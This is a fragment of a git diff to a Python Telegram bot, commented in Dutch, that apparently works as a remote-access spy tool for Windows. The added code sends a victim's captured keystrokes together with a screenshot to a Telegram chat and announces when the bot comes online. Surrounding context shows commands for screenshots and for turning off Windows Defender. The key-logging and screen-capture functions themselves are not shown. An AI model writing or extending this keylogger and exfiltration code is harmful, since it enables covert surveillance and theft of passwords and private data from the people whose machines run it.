@@ -4,6 +4,11 @@ from telegram.ext import ContextTypes
 from functions import *
 
 
+# functies die starten zodra de bot online is
+async def startup_functions(app, id):
+    # stuur de banner naar de chat als de bot online staat
+    await app.bot.send_message(chat_id=id, text=f"```\n{get_banner()}\n```", parse_mode="MarkdownV2")
+
 # lijst van alle commands terug geven
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(get_command_list())
@@ -34,7 +39,12 @@ async def ss_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # key logged string sturen naar chat
 async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(key_log())
+    string = key_log()
+    await context.bot.send_photo(
+        chat_id=update.effective_chat.id,
+        photo=open(get_screen(), 'rb'),
+        caption=f'string:   {string}'
+    )
 
 # Windows defender uitzetten
 async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
